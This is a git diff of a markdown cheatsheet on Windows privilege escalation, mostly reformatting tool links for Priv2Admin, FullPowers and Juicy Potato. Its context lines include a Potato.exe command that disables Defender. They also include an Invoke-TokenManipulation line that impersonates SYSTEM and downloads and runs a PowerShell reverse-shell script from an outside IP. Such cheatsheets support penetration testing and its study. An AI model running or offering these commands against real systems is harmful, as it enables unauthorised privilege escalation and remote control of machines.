@@ -340,7 +340,7 @@ Write-ServiceBinary
 
 ### Manual exploit Binary Path
 
-Tested on Windows XP SP1
+> Tested on Windows XP SP1
 
 ```bat
 sc qc upnphost
@@ -517,17 +517,8 @@ Example: "Windows Help and Support" \(Windows + F1\), search for "command prompt
 
 ## **Abusing privileges**
 
-Tools
-
-```bat
-- Rubeus.exe 
-
-- Priv checklist
-https://github.com/gtworek/Priv2Admin
-
-- Enable all privs for service or network account
-https://github.com/itm4n/FullPowers
-```
+- [Priv2Admin](https://github.com/gtworek/Priv2Admin) : primary token checklist
+- [FullPowers](https://github.com/itm4n/FullPowers) : Enable all privs for service or network account
 
 ### Hot potato
 
@@ -536,7 +527,7 @@ https://github.com/itm4n/FullPowers
 exe : [Potato.exe](https://github.com/foxglovesec/Potato)
 
 ```bat
-  Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
+Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true
 ```
 
 powershell : [Tater.ps1](https://github.com/Kevin-Robertson/Tater)
@@ -571,13 +562,13 @@ Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
 Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
 Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
 ```
-> For more information, see next cheatsheet Domain Escalation
+> For more details, see next cheatsheet : [Domain Escalation](08-domain-escalation.md)
 
 ### Juicy Potato
 
 **abusing the golden privileges**
 
-[releases](https://github.com/ohpe/juicy-potato/releases) 
+- [Juicy Potato releases](https://github.com/ohpe/juicy-potato/releases) 
 > Juicy Potato doesn't work on Windows Server 2019 and Windows 10 1809 +.
 
 ```bat
